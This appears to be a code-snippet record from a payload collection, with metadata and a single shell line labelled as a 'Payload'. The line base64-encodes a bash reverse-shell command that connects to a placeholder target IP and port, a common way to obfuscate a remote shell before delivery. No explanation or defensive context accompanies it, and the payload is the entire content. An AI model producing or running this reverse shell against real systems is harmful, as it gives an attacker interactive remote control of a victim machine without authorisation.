---
id: c01a5fe7-5694-4698-a2f6-a5821d43d281
type: code
language: Payload
verified: false
created_at: '2020-03-17T05:29:53.538613+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet c01a5fe7

**Language**: Payload

```payload
echo 'bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1' | base64 -w 0
```


